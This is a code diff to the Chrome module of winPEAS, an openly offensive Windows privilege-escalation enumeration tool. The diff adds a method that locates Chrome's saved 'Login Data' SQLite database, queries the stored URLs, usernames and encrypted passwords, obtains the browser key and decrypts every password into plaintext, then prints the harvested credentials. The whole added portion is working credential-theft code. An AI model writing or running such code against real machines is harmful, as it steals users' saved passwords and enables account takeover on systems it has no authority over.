@@ -1,17 +1,26 @@
-﻿using System;
+﻿using CS_SQLite3;
+using System;
 using System.Collections.Generic;
+using System.Data;
 using System.IO;
 using System.Text.RegularExpressions;
 using System.Web.Script.Serialization;
 using winPEAS.Checks;
 using winPEAS.Helpers;
+using winPEAS.KnownFileCreds.Browsers.Decryptor;
+using winPEAS.KnownFileCreds.Browsers.Models;
 
-namespace winPEAS.KnownFileCreds.Browsers
+namespace winPEAS.KnownFileCreds.Browsers.Chrome
 {
-    internal class Chrome : IBrowser
+    internal class Chrome : BrowserBase, IBrowser
     {
-        public void PrintInfo()
+        public override string Name => "Chrome";
+
+        private const string LOGIN_DATA_PATH = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+
+        public override void PrintInfo()
         {
+            PrintSavedCredentials();
             PrintDBsChrome();
             PrintHistBookChrome();
         }
@@ -264,6 +273,51 @@ namespace winPEAS.KnownFileCreds.Browsers
                 }
             }
             return results;
+        }
+
+        public override IEnumerable<CredentialModel> GetSavedCredentials()
+        {
+            var result = new List<CredentialModel>();
+
+            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
+            var p = Path.GetFullPath(appdata + LOGIN_DATA_PATH);
+
+            if (File.Exists(p))
+            {
+                SQLiteDatabase database = new SQLiteDatabase(p);
+                string query = "SELECT action_url, username_value, password_value FROM logins";
+                DataTable resultantQuery = database.ExecuteQuery(query);
+
+                if (resultantQuery.Rows.Count > 0)
+                {
+                    var key = GCDecryptor.GetChromeKey();
+
+                    foreach (DataRow row in resultantQuery.Rows)
+                    {
+                        byte[] nonce, ciphertextTag;
+                        byte[] encryptedData = Convert.FromBase64String((string)row["password_value"]);
+                        GCDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
+                        var pass = GCDecryptor.Decrypt(ciphertextTag, key, nonce);
+
+                        string actionUrl = row["action_url"] is System.DBNull ? string.Empty : (string)row["action_url"];
+                        string usernameValue = row["username_value"] is System.DBNull ? string.Empty : (string)row["username_value"];
+
+                        result.Add(new CredentialModel()
+                        {
+                            Url = actionUrl,
+                            Username = usernameValue,
+                            Password = pass
+                        });
+                    }
+
+                    database.CloseDatabase();
+                }
+            }
+            else
+            {
+                throw new FileNotFoundException("Cannot find chrome logins file");
+            }
+            return result;
         }
     }
 }
